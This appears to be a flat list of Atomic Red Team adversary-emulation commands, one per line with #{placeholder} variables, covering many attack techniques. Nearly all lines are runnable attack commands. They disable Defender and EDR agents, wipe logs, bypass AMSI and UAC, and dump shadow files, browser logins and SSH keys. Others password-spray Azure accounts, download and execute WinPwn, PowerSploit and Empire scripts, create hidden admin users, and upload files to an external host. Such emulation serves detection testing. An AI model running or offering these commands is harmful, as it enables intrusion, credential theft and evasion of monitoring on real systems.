sudo launchctl unload /Library/LaunchDaemons/com.carbonblack.daemon.plist&&sudo launchctl unload /Library/LaunchDaemons/com.carbonblack.defense.daemon.plist
copy %SystemRoot%\System32\cmd.exe %SystemRoot%\Temp\lsass.exe;%SystemRoot%\Temp\lsass.exe /B
g++ #{input_file} && ./a.out&&clang++ #{input_file} && ./a.out
cat /dev/null > /var/log/messages #truncating the file to zero bytes&&cat /dev/zero > /var/lol/messages #log file filled with null bytes(zeros)
Import-Module -Name Az.Resources;$PWord = ConvertTo-SecureString -String "#{password}" -AsPlainText -Force;$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList "#{username}", $Pword;Connect-AzAccount -Credential $Credential;;$sp = Get-AzADServicePrincipal | where-object {$_.DisplayName -eq "#{service_principal_name}"};if ($sp -eq $null) { Write-Warning "Service Principal not found"; exit };$subscription = Get-AzSubscription | where-object {$_.Name -eq "#{subscription}"} ;if ($subscription -eq $null) { Write-Warning "Subscription not found"; exit };$role = Get-AzRoleDefinition | where-object {$_.Name -eq "#{role_name}"};if ($role -eq $null) { Write-Warning "Role not found"; exit };;New-AzRoleAssignment -ObjectId $sp.id -RoleDefinitionId $role.id -Scope /subscriptions/$subscription;Write-Host "Service Principal $($sp.DisplayName) was added to $($role.Name) role in subscriptions $($subscriptions.Name)"
Set-ItemProperty "HKLM:\SOFTWARE\Microsoft\Active Setup\Installed Components\{C9E9A340-D1F1-11D0-821E-444553540600}" "StubPath" "#{payload}" -Force;& $env:SYSTEMROOT\system32\runonce.exe /AlternateShellStartup
wmic group get name
hostname&&whoami
$url = "#{url_of_wallpaper}";$imgLocation = "#{wallpaper_location}";$orgWallpaper = (Get-ItemProperty -Path Registry::'HKEY_CURRENT_USER\Control Panel\Desktop\' -Name WallPaper).WallPaper;$orgWallpaper | Out-File -FilePath "#{pointer_to_orginal_wallpaper}";$updateWallpapercode = @' ;using System.Runtime.InteropServices; ;namespace Win32{;;    public class Wallpaper{ ;        [DllImport("user32.dll", CharSet=CharSet.Auto)] ;         static extern int SystemParametersInfo (int uAction , int uParam , string lpvParam , int fuWinIni) ; ;         ;         public static void SetWallpaper(string thePath){ ;            SystemParametersInfo(20,0,thePath,3); ;        };    };} ;'@;$wc = New-Object System.Net.WebClient  ;try{  ;    $wc.DownloadFile($url, $imgLocation);    add-type $updateWallpapercode ;    [Win32.Wallpaper]::SetWallpaper($imgLocation);} ;catch [System.Net.WebException]{  ;    Write-Host("Cannot download $url") ;    add-type $updateWallpapercode ;    [Win32.Wallpaper]::SetWallpaper($imgLocation);} ;finally{    ;    $wc.Dispose()  ;}
dd of=#{file_to_overwrite} if=#{overwrite_source} count=$(ls -l #{file_to_overwrite} | awk '{print $5}') iflag=count_bytes
wmic qfe get description,installedOn /format:csv
for i in $(seq 1 5); do echo "$i, Atomic Red Team was here!"; sleep 1; done
Get-CimInstance -ClassName Win32_Process -Property Name, CommandLine, ProcessId -Filter "Name = 'svchost.exe' AND CommandLine LIKE '%'" | Select-Object -First 1 | Start-ATHProcessUnderSpecificParent -FilePath #{file_path} -CommandLine '#{command_line}'
Import-Module -Name AzureAD;$PWord = ConvertTo-SecureString -String "#{valid_password}" -AsPlainText -Force;$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList "#{valid_username}", $Pword;Connect-AzureAD -Credential $Credential > $null;;($Users = Get-AzureADUser -All $true) > $null;Disconnect-AzureAD > $null;$PWord = ConvertTo-SecureString -String "#{password}" -AsPlainText -Force;;$Users | Foreach-Object {;  $user = $_.UserPrincipalName;  $Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList "$user", $Pword;  try {;    Write-Host " [-] Attempting #{password} on account ${user}.";    Connect-AzureAD -Credential $Credential 2>&1> $null;    # if credentials aren't correct, it will break just above and goes into catch block, so if we're here we can display success;    Write-Host " [!] ${user}:#{password} are valid credentials!`r`n";    Disconnect-AzureAD > $null;  } catch {;    Write-Host " [-] ${user}:#{password} invalid credentials.`r`n";  };};Write-Host "End of password spraying"
reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f
find / -path "*/.config/chromium/*/Bookmarks" -exec echo {} >> #{output_file} \;&&cat #{output_file} 2>/dev/null
# Import the required test harness function, Invoke-BuildAndInvokeInstallUtilAssembly;. "#{test_harness}";;$InstallerAssemblyDir = "#{assembly_dir}";$InstallerAssemblyFileName = "#{assembly_filename}";$InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName;;$CommandLine = "/logfile= /logtoconsole=false /U `"$InstallerAssemblyFullPath`"";$ExpectedOutput = 'Constructor_Uninstall_';;$TestArgs = @{;    OutputAssemblyDirectory = $InstallerAssemblyDir;    OutputAssemblyFileName = $InstallerAssemblyFileName;    InvocationMethod = '#{invocation_method}';    CommandLine = $CommandLine;};;$ActualOutput = Invoke-BuildAndInvokeInstallUtilAssembly @TestArgs;;if ($ActualOutput -ne $ExpectedOutput) {;    throw @";InstallUtil Uninstall method execution test failure. Installer assembly execution output did not match the expected output.;Expected: $ExpectedOutput;Actual: $ActualOutput;"@;}
sudo nmap -sS #{network_range} -p #{port}&&telnet #{host} #{port}&&nc -nv #{host} #{port}
[activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.application","#{computer_name}")).Document.ActiveView.ExecuteShellCommand("c:\windows\system32\calc.exe", $null, $null, "7")
$notepad = Start-Process notepad -passthru;Start-Process "$PathToAtomicsFolder\T1055\bin\x64\InjectView.exe"
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;IEX (iwr "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1" -UseBasicParsing);$macrocode = "   Open `"#{jse_path}`" For Output As #1`n   Write #1, `"WScript.Quit`"`n   Close #1`n   Shell`$ `"cscript.exe #{jse_path}`"`n";Invoke-MalDoc -macroCode $macrocode -officeProduct "#{ms_product}"
sudo cat /etc/shadow > #{output_file}&&cat #{output_file}
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Event Viewer" /v MicrosoftRedirectionURL /t REG_SZ /d "#{redirection_url}" /f
truncate -s0 #{history_path}
$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t';iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1');winPEAS -noninteractive -consoleoutput
$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t';iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1');lazagnemodule -consoleoutput -noninteractive
$PathToAtomicsFolder\T1055\bin\x64\CreateThread.exe -debug
zip -r  #{input_folder}/#{input_file}.zip #{input_folder}&&openssl enc -aes-256-cbc -pass pass:#{enc_pass} -p -in #{input_folder}/#{input_file}.zip -out #{input_folder}/#{input_file}.enc &&cat #{input_folder}/#{input_file}.enc | base64
docker build -t t1613 $PathtoAtomicsFolder/T1613/src/&&docker run --name t1613_container -d -t t1613&&docker ps&&docker stats --no-stream&&docker inspect $(docker ps -l -q --filter ancestor=t1613)
sudo shred -u -z -n 3 #{system_log_path}
cp "$PathToAtomicsFolder/T1110.004/src/credstuffuserpass.txt" /tmp/&&for unamepass in $(cat /tmp/credstuffuserpass.txt);do sshpass -p `echo $unamepass | cut -d":" -f2` ssh -o 'StrictHostKeyChecking=no' `echo $unamepass | cut -d":" -f1`@#{target_host};done
sudo #{program_path} -i #{ifname} -t 3
$excludedProcess = "#{excluded_process}";Add-MpPreference -ExclusionProcess $excludedProcess
(New-Object Net.WebClient).DownloadString('#{target_remote_file}') | Out-File #{output_file}; Invoke-Item #{output_file}
ssh #{domain} "(cd /etc && tar -zcvf - *)" > ./etc.tar.gz
for file in $(find #{file_path} -type f -name .netrc 2> /dev/null);do echo $file ; cat $file ; done
"PathToAtomicsFolder\..\ExternalPayloads\remcom.exe" \\#{remote_host} /user:#{user_name} /pwd:#{password} cmd.exe
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;IEX (IWR 'https://raw.githubusercontent.com/BC-SECURITY/Empire/f6efd5a963d424a1f983d884b637da868e5df466/data/module_source/privesc/Get-System.ps1' -UseBasicParsing); Get-System -Technique NamedPipe -Verbose
$secure_pwd = "#{password}" | ConvertTo-SecureString -AsPlainText -Force;$creds = New-Object System.Management.Automation.PSCredential -ArgumentList "#{username}", $secure_pwd;Connect-AzureAD -Credential $creds;Remove-AzEventHub -ResourceGroupName #{resource_group} -Namespace #{name_space_name} -Name #{event_hub_name}
$oldvalue = $(Get-ItemProperty HKLM:\System\CurrentControlSet\Control\Lsa -Name 'Security Packages' | Select-Object -ExpandProperty 'Security Packages');;Set-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Lsa" -Name 'Security Packages old' -Value "$oldvalue";;$newvalue = "AtomicTest.dll";;Set-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa -Name 'Security Packages' -Value $newvalue
"#{venv_path}\Scripts\pypykatz" live lsa 
attrib.exe +s #{file_to_modify}
Write-Host "Creating registry keys in HKCU:Software\Classes\CLSID\#{clsid_guid}" -ForegroundColor Cyan;New-Item -Path "HKCU:\Software\Classes\CLSID\#{clsid_guid}\InprocServer32" -Value "#{file_name}" -Force | Out-Null;New-ItemProperty -Path HKCU:\Environment -Name "COR_ENABLE_PROFILING" -PropertyType String -Value "1" -Force | Out-Null;New-ItemProperty -Path HKCU:\Environment -Name "COR_PROFILER" -PropertyType String -Value "#{clsid_guid}" -Force | Out-Null;New-ItemProperty -Path HKCU:\Environment -Name "COR_PROFILER_PATH" -PropertyType String -Value "#{file_name}" -Force | Out-Null;Write-Host "executing eventvwr.msc" -ForegroundColor Cyan;START MMC.EXE EVENTVWR.MSC
"#{uacme_exe}"
cd "PathToAtomicsFolder\..\ExternalPayloads";.\kerbrute.exe passwordspray --dc #{domaincontroller} -d #{domain} "PathToAtomicsFolder\..\ExternalPayloads\passwordspray.txt" password132 
sudo #{program_path} -i #{ifname} -t 3
env
Invoke-CimMethod -ClassName Win32_Product -MethodName #{action} -Arguments @{ PackageLocation = '#{msi_payload}' }
python "#{filename}" -i #{host_ip}
& "PathToAtomicsFolder\..\ExternalPayloads\AdFind.exe" #{optional_args} -h #{domain} -s subtree -f "objectclass=computer" *
cp #{bin_path} /tmp/packed_bin && /tmp/packed_bin
Copy-Item "$env:APPDATA\Mozilla\Firefox\Profiles\" -Destination "PathToAtomicsFolder\..\ExternalPayloads" -Force -Recurse
ls -recurse;get-childitem -recurse;gci -recurse
cat /etc/pam.d/system-auth&&cat /etc/security/pwquality.conf
kubectl get secrets --all-namespaces
net.exe start >> #{output_file}
$url = 'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1566.001/bin/PhishingAttachment.xlsm';[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;Invoke-WebRequest -Uri $url -OutFile $env:TEMP\PhishingAttachment.xlsm
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
$file = New-Item $env:windir\registration\04e53197-72be-4dd8-88b1-533fe6eed577.04e53197-72be-4dd8-88b1-533fe6eed577.crmlog; $file.Attributes = 'Hidden', 'System', 'Archive'; Write-Host "File created: $($file.FullName)"
echo "# THIS IS A COMMENT" >> /etc/default/ufw&&grep "# THIS IS A COMMENT" /etc/default/ufw
mkdir #{output_folder}&&find #{search_path} -name id_rsa 2>/dev/null -exec cp --parents {} #{output_folder} \;&&exit 0
$datePath = "certutil-$(Get-Date -format yyyy_MM_dd)";New-Item -Path $datePath -ItemType Directory;Set-Location $datePath;certutil -verifyctl -split -f #{remote_file};Get-ChildItem | Where-Object {$_.Name -notlike "*.txt"} | Foreach-Object { Move-Item $_.Name -Destination #{local_path} }
$cmDwhy =[TyPe]("{0}{1}" -f 'S','TrING')  ;   $pz2Sb0  =[TYpE]("{1}{0}{2}"-f'nv','cO','ert')  ;  &("{0}{2}{3}{1}{4}" -f'In','SiO','vOKe-EXp','ReS','n') (  (&("{1}{2}{0}"-f'blE','gET-','vaRIA')  ('CMdw'+'h'+'y'))."v`ALUe"::("{1}{0}" -f'iN','jO').Invoke('',( (127, 162,151, 164,145 ,55 , 110 ,157 ,163 , 164 ,40,47, 110 , 145 ,154, 154 ,157 , 54 ,40, 146, 162 , 157,155 ,40, 120, 157 ,167,145 , 162 ,123,150 ,145 , 154 , 154 , 41,47)| .('%') { ( [CHAR] (  $Pz2sB0::"t`OinT`16"(( [sTring]${_}) ,8)))})) )
$secure_pwd = "#{password}" | ConvertTo-SecureString -AsPlainText -Force;$creds = New-Object System.Management.Automation.PSCredential -ArgumentList "#{username}", $secure_pwd;Connect-ExchangeOnline -Credential $creds;Set-AdminAuditLogConfig -UnifiedAuditLogIngestionEnabled $False
Unblock-File -Path #{file_path}
ENCODED=$(python3 -c 'import base64;enc=base64.b64encode("#{message}".encode());print(enc.decode())')&&python3 -c "import base64;dec=base64.b64decode(\"$ENCODED\");print(dec.decode())"&&python3 -c "import base64 as d;dec=d.b64decode(\"$ENCODED\");print(dec.decode())"&&python3 -c "from base64 import b64decode;dec=b64decode(\"$ENCODED\");print(dec.decode())"&&python3 -c "from base64 import b64decode as d;dec=d(\"$ENCODED\");print(dec.decode())"&&echo $ENCODED | python3 -c "import base64,sys;dec=base64.b64decode(sys.stdin.read());print(dec.decode())"&&echo $ENCODED > #{encoded_file} && python3 -c "import base64;dec=base64.b64decode(open('#{encoded_file}').read());print(dec.decode())"
useradd -g 0 -M -d /root -s /bin/bash #{username}&&if [ $(cat /etc/os-release | grep -i 'Name="ubuntu"') ]; then echo "#{username}:#{password}" | sudo chpasswd; else echo "#{password}" | passwd --stdin #{username}; fi;
cmd /c "#{ps_exec_location}" -accepteula -i -s cmd.exe /c logman update trace "#{session}" --p "#{provider}" -ets
$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t';iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1');dotnet -consoleoutput -noninteractive
netstat -r | grep default
Dism /online /Disable-Feature /FeatureName:Windows-Defender /Remove /NoRestart /quiet
chmod +x #{autosuid}&&bash #{autosuid}
mavinject.exe #{process_id} /INJECTRUNNING "#{dll_payload}"
#{msi_exe} /q /#{action} "#{msi_payload}"
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1' -UseBasicParsing); Get-DomainGroupMember "Domain Admins"
if (-not (Test-Path "#{file_to_delete}")) { New-Item "#{file_to_delete}" -Force };& "#{sdelete_exe}" -accepteula "#{file_to_delete}"
PS2=`logger -t "$USER" -f ~/.sh_history`&&$PS2&&tail /var/log/messages
"#{recon_commands}"
$TokenSet = @{;  U = [Char[]]'ABCDEFGHIJKLMNOPQRSTUVWXYZ';  N = [Char[]]'0123456789';};$Upper = Get-Random -Count 5 -InputObject $TokenSet.U;$Number = Get-Random -Count 5 -InputObject $TokenSet.N;$StringSet = $Upper + $Number;$rad = (Get-Random -Count 5 -InputObject $StringSet) -join '';$file = "rad" + $rad + ".tmp";;whoami.exe /all >> #{output_path}\$file
$exfil_folder = "$env:temp\T1555.003";if (test-path "$exfil_folder") {} else {new-item -path "$env:temp" -Name "T1555.003" -ItemType "directory" -force};$FirefoxCredsLocation = get-childitem -path "$env:appdata\Mozilla\Firefox\Profiles\*.default-release\";if (test-path "$FirefoxCredsLocation\key4.db") {copy-item "$FirefoxCredsLocation\key4.db" -destination "$exfil_folder\T1555.003Firefox_key4.db"} else {};if (test-path "$FirefoxCredsLocation\logins.json") {copy-item "$FirefoxCredsLocation\logins.json" -destination "$exfil_folder\T1555.003Firefox_logins.json"} else {};if (test-path "$env:localappdata\Google\Chrome\User Data\Default\Login Data") {copy-item "$env:localappdata\Google\Chrome\User Data\Default\Login Data" -destination "$exfil_folder\T1555.003Chrome_Login Data"} else {};if (test-path "$env:localappdata\Google\Chrome\User Data\Default\Login Data For Account") {copy-item "$env:localappdata\Google\Chrome\User Data\Default\Login Data For Account" -destination "$exfil_folder\T1555.003Chrome_Login Data For Account"} else {};if (test-path "$env:appdata\Opera Software\Opera Stable\Login Data") {copy-item "$env:appdata\Opera Software\Opera Stable\Login Data" -destination "$exfil_folder\T1555.003Opera_Login Data"} else {};if (test-path "$env:localappdata/Microsoft/Edge/User Data/Default/Login Data") {copy-item "$env:localappdata/Microsoft/Edge/User Data/Default/Login Data" -destination "$exfil_folder\T1555.003Edge_Login Data"} else {} ;compress-archive -path "$exfil_folder" -destinationpath "$exfil_folder.zip" -force
"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -exec bypass -noprofile "$Xml = (New-Object System.Xml.XmlDocument);$Xml.Load('#{url}');$Xml.command.a.execute | IEX"
Gpscript /startup
net accounts /domain
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-Sharpweb.ps1');Invoke-Sharpweb -command "all"
"#{gsecdump_exe}" -a
$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t';iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1');UACBypass -noninteractive -command "C:\windows\system32\calc.exe" -technique ccmstp
sudo truncate -s 0 #{system_log_path} #size parameter shorthand&&sudo truncate --size=0 #{system_log_path} #size parameter 
New-Item -Path "C:\Users\$env:USERNAME\AppData\Local\Comms\Unistore\data\copy" -ItemType Directory -ErrorAction Ignore;Get-ChildItem -Path "C:\Users\$env:USERNAME\AppData\Local\Comms\Unistore\data" -Exclude copy | ForEach-Object { Copy-Item -Path $_.FullName -Destination "C:\Users\$env:USERNAME\AppData\Local\Comms\Unistore\data\copy" -Recurse -Force -ErrorAction Ignore };Remove-Item -Path "C:\Users\$env:USERNAME\AppData\Local\Comms\Unistore\data\copy" -Recurse -Force -ErrorAction Ignore
Import-Module -Name AzureAD;;$passwords = "#{passwords}".split("{`n}");foreach($password in $passwords) {;  $PWord = ConvertTo-SecureString -String "$password" -AsPlainText -Force;  $Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList "#{username}", $Pword;  try {;    Write-Host " [-] Attempting ${password} on account #{username}.";    Connect-AzureAD -Credential $Credential 2>&1> $null;    # if credentials aren't correct, it will break just above and goes into catch block, so if we're here we can display success;    Write-Host " [!] #{username}:${password} are valid credentials!`r`n";    break;  } catch {;    Write-Host " [-] #{username}:${password} invalid credentials.`r`n";  };};Write-Host "End of bruteforce"
$cert = Import-Certificate -FilePath #{pfx_path} -CertStoreLocation Cert:\LocalMachine\My;Move-Item -Path $cert.PSPath -Destination "Cert:\LocalMachine\Root"
reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f
touch /var/tmp/T1564.001_mac.txt&&chflags hidden /var/tmp/T1564.001_mac.txt
sudo systemctl stop falcon-sensor.service&&sudo systemctl disable falcon-sensor.service
cp ~/Library/"Application Support/Google/Chrome/Default/Login Data" "/tmp/T1555.003_Login Data"&&cp ~/Library/"Application Support/Google/Chrome/Default/Login Data For Account" "/tmp/T1555.003_Login Data For Account"
Invoke-ATHHTMLApplication -HTAFilePath #{hta_file_path} -ScriptEngine #{script_engine} -AsLocalUNCPath -SimulateLateralMovement -MSHTAFilePath #{mshta_file_path}
reg add HKLM\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\ImmersiveShell /v UseActionCenterExperience /t REG_DWORD /d 0 /f
cp #{payload} /tmp/hello.c&&sudo chown root /tmp/hello.c&&sudo make /tmp/hello&&sudo chown root /tmp/hello&&sudo chmod u+s /tmp/hello&&/tmp/hello
systemd-run --user --unit=Atomic-Red-Team --on-calendar '*:0/1' /bin/sh -c 'echo "$(date) $(whoami)" >>/tmp/log'
xwd -root -out #{output_file}&&xwud -in #{output_file}
poweroff -r 3
ls -a >> #{output_file}&&if [ -d /Library/Preferences/ ]; then ls -la /Library/Preferences/ > #{output_file}; fi;&&file */* *>> #{output_file}&&cat #{output_file} 2>/dev/null&&find . -type f&&ls -R | grep ":$" | sed -e 's/:$//' -e 's/[^-][^\/]*\//--/g' -e 's/^/ /' -e 's/-/|/'&&locate *&&which sh
tcpdump -c 5 -nnni #{interface}&&tshark -c 5 -i #{interface}
TMPFILE=$(mktemp)&&echo "id" > $TMPFILE&&bash $TMPFILE
echo var url = "#{file_url}", fso = WScript.CreateObject('Scripting.FileSystemObject'), request, stream; request = WScript.CreateObject('MSXML2.ServerXMLHTTP'); request.open('GET', url, false); request.send(); if (request.status === 200) {stream = WScript.CreateObject('ADODB.Stream'); stream.Open(); stream.Type = 1; stream.Write(request.responseBody); stream.Position = 0; stream.SaveToFile(filename, 1); stream.Close();} else {WScript.Quit(1);}WScript.Quit(0); > #{script_file};cscript //E:Jscript #{script_file}
get-ADPrincipalGroupMembership #{user} | select name
echo "#{pwd_for_encrypted_file}" | $which_gpg --batch --yes --passphrase-fd 0 --cipher-algo #{encryption_alg} -o #{encrypted_file_path} -c #{input_file_path}
if [ "$(uname)" = 'FreeBSD' ]; then cmd="b64decode -r"; else cmd="base64 -d"; fi;&&cat /tmp/encoded.dat | $cmd > /tmp/art.sh&&chmod +x /tmp/art.sh&&/tmp/art.sh
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Get-System-Techniques/master/NamedPipe/NamedPipeSystem.ps1')
"#{uacme_exe}"
Import-Module -Name AzureAD;$PWord = ConvertTo-SecureString -String "#{password}" -AsPlainText -Force;$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList "#{username}", $Pword;Connect-AzureAD -Credential $Credential;;$aadApplication = New-AzureADApplication -DisplayName "#{application_name}";$servicePrincipal = New-AzureADServicePrincipal -AppId $aadApplication.AppId;#$aadApplication = Get-AzureADApplication -Filter "DisplayName eq '#{application_name}'";;#Get Service Principal of Microsoft Graph Resource API ;$graphSP = Get-AzureADServicePrincipal -Filter "DisplayName eq 'Microsoft Graph'";;#Initialize RequiredResourceAccess for Microsoft Graph Resource API ;$requiredGraphAccess = New-Object Microsoft.Open.AzureAD.Model.RequiredResourceAccess;$requiredGraphAccess.ResourceAppId = $graphSP.AppId;$requiredGraphAccess.ResourceAccess = New-Object System.Collections.Generic.List[Microsoft.Open.AzureAD.Model.ResourceAccess];;#Set Application Permissions;$ApplicationPermissions = @('#{application_permission}');;$reqPermission = $graphSP.AppRoles | Where-Object {$_.Value -eq $ApplicationPermissions};if($reqPermission);{;$resourceAccess = New-Object Microsoft.Open.AzureAD.Model.ResourceAccess;$resourceAccess.Type = "Role";$resourceAccess.Id = $reqPermission.Id    ;#Add required app permission;$requiredGraphAccess.ResourceAccess.Add($resourceAccess);};else;{;Write-Host "App permission $permission not found in the Graph Resource API" -ForegroundColor Red;};;#Add required resource accesses;$requiredResourcesAccess = New-Object System.Collections.Generic.List[Microsoft.Open.AzureAD.Model.RequiredResourceAccess];$requiredResourcesAccess.Add($requiredGraphAccess);;#Set permissions in existing Azure AD App;Set-AzureADApplication -ObjectId $aadApplication.ObjectId -RequiredResourceAccess $requiredResourcesAccess;;$servicePrincipal = Get-AzureADServicePrincipal -Filter "AppId eq '$($aadApplication.AppId)'";;New-AzureADServiceAppRoleAssignment -ObjectId $servicePrincipal.ObjectId -PrincipalId $servicePrincipal.ObjectId -ResourceId $graphSP.ObjectId -Id $reqPermission.Id
sudo cat /dev/null > #{system_log_path} #truncating the file to zero bytes&&sudo dd if=/dev/zero bs=1000 count=5 of=#{system_log_path} #log file filled with null bytes(zeros)
C:\Windows\System32\inetsrv\appcmd.exe set config "#{website_name}" /section:httplogging /dontLog:true
where /R C:\Users\ Bookmarks
1..#{limit} | % { ; try { [System.IO.File]::Copy("\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy$_\Windows\System32\config\#{target_hive}" , "$env:TEMP\#{target_hive}vss$_", "true") } catch {}; ls "$env:TEMP\#{target_hive}vss$_" -ErrorAction Ignore;}
cat /etc/shells 
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1' -UseBasicParsing); Get-DomainGroup -verbose
Import-Module "PathToAtomicsFolder\..\ExternalPayloads\AzureStealth.ps1" -force      ;$Password = ConvertTo-SecureString -String "#{password}" -AsPlainText -Force;$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList "#{username}", $Password;Connect-AzAccount -Credential $Credential;Connect-AzureAD -Credential $Credential;Scan-AzureAdmins -UseCurrentCred
kldstat&&kldstat | grep vmm
dscl . -create /Users/AtomicUser&&dscl . -create /Users/AtomicUser UserShell /bin/bash&&dscl . -create /Users/AtomicUser RealName "Atomic User"&&dscl . -create /Users/AtomicUser UniqueID 503&&dscl . -create /Users/AtomicUser PrimaryGroupID 503&&dscl . -create /Users/AtomicUser NFSHomeDirectory /Local/Users/AtomicUser&&dscl . -passwd /Users/AtomicUser mySecretPassword&&dscl . -append /Groups/admin GroupMembership AtomicUser
wmic.exe /Namespace:\\root\Microsoft\Windows\Defender class MSFT_MpPreference call Add ExclusionPath=\"ATOMICREDTEAM\"
rundll32.exe advpack.dll,LaunchINFSection "#{inf_to_execute}",DefaultInstall_SingleUser,1,
chown #{owner} #{file_or_folder}
IF EXIST "%temp%\Windows_Defender_Scheduled_Scan.xml" ( schtasks /delete /tn "\Microsoft\Windows\Windows Defender\Windows Defender Scheduled Scan" /f );IF EXIST "%temp%\Windows_Defender_Cleanup.xml" ( schtasks /delete /tn "\Microsoft\Windows\Windows Defender\Windows Defender Cleanup" /f );IF EXIST "%temp%\Windows_Defender_Verification.xml" ( schtasks /delete /tn "\Microsoft\Windows\Windows Defender\Windows Defender Verification" /f );IF EXIST "%temp%\Windows_Defender_Cache_Maintenance.xml" ( schtasks /delete /tn "\Microsoft\Windows\Windows Defender\Windows Defender Cache Maintenance" /f )
Start-Process "#{NetSupport_Path}" -ArgumentList "/S /v/qn"
sudo #{program_path} -f -i #{ifname} -t 3
ENCODED=$(perl -e "use MIME::Base64;print(encode_base64('#{message}'));")&&perl -le "use MIME::Base64;print(decode_base64('$ENCODED'));"&&echo $ENCODED | perl -le 'use MIME::Base64;print(decode_base64(<STDIN>));'&&echo $ENCODED > #{encoded_file} && perl -le 'use MIME::Base64;open($f,"<","#{encoded_file}");print(decode_base64(<$f>));'
copy C:\Windows\System32\cmd.exe C:\svchost.exe;C:\svchost.exe /c echo T1105 > \\localhost\c$\T1105.txt
unlink /var/log/messages
for ip in $(seq #{start_host} #{stop_host}); do ping -c 1 #{subnet}.$ip; [ $? -eq 0 ] && echo "#{subnet}.$ip UP" || : ; done
net share
openssl genrsa -out #{key_filename} 4096&&openssl req -x509 -new -nodes -key #{key_filename} -sha256 -days 365 -subj "/C=US/ST=Denial/L=Springfield/O=Dis/CN=www.example.com" -out #{cert_filename}&&cp #{cert_filename} /usr/local/share/certs/&&certctl rehash
#{msi_exe} /q /#{action} "#{msi_payload}"
dsquery * -filter "(objectClass=trustedDomain)" -attr *
path=%path%;"C:\Program Files (x86)\winzip";mkdir .\tmp\victim-files;cd .\tmp\victim-files;echo "This file will be encrypted" > .\encrypted_file.txt;"#{winzip_exe}" -min -a -s"hello" archive.zip *;dir
wmic useraccount get /ALL /format:csv
$fileName = "#{file}";$url = "#{domain}";$file = New-Item -Force $fileName -Value "This is ART IcedID Botnet Exfil Test";$contentType = "application/octet-stream";try {Invoke-WebRequest -Uri $url -Method Put -ContentType $contentType -InFile $fileName} catch{}
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Get-System-Techniques/master/CreateProcess/Get-CreateProcessSystem.ps1')
$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t';iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1');Dotnetsearch -noninteractive -consoleoutput
Copy-Item "$PathToAtomicsFolder\T1547.001\src\vbsstartup.vbs" "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\vbsstartup.vbs";Copy-Item "$PathToAtomicsFolder\T1547.001\src\vbsstartup.vbs" "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\vbsstartup.vbs";cscript.exe "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\vbsstartup.vbs";cscript.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\vbsstartup.vbs"
dscl . -delete /Users/#{user_account} #enter admin password
net user /domain;get-localgroupmember -group Users;get-aduser -filter *
$typicalPath = "HKLM:\SOFTWARE\Classes\.wav\OpenWithProgIds"; $randomBytes = New-Object Byte[] 0x1000; (New-Object Random).NextBytes($randomBytes); New-ItemProperty -Path $typicalPath -Name "AtomicSnake" -Value $randomBytes -PropertyType Binary -Force | Out-Null
tcpdump -c 5 -nnni #{interface}&&tshark -c 5 -i #{interface}
